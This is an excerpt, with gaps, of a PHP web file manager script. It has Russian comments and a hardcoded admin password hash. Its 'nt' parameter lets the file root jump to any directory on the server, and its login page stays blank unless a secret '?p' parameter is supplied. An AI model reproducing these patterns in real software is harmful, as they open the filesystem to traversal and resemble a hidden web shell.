...
if (!empty($_GET['nt'])) {
    $nt = trim($_GET['nt']);
    $requested = realpath($path . '/' . $nt);

    if ($requested && is_dir($requested)) {
        $root_path = $requested;
    }
...
$auth_users = array(
    'admin' => '$2y$10$1jjU/DwBb8swXsbLvD7WL.U4iUHTO4qJt0EC61tI5BIzv/xgB.eBO',
);
...
if(!isset($_SESSION[FM_SESSION_ID]['logged'], $auth_users[$_SESSION[FM_SESSION_ID]['logged']]) && !isset($_GET['p'])){
    return;
}
                ...
                <div class="row justify-content-md-center align-content-center h-100vh">
                    <div class="card-wrapper">
                        <div class="card fat" data-bs-theme="<?php echo FM_THEME; ?>">
                            <div class="card-body">
                                <form class="form-signin" action="?p" method="post" autocomplete="off">
                                    <div class="mb-3">
                                        <div class="brand">
...
function fm_show_nav_path($path)
{
    ...
    [<a href="<?php echo fm_path_link(); ?>">web</a>] <?php echo __DIR__;?>
    <?php
}

function fm_path_link()
{
    $full_path = realpath(__DIR__); // например: /Users/pc/Local Sites/block/app/public
    $base_prefix = '/Users/'; // от чего будем отрезать
    $relative_path = str_replace($base_prefix, '', $full_path); // результат: pc/Local Sites/block/app/public
    $url_param = urlencode($relative_path); // закодируем для URL
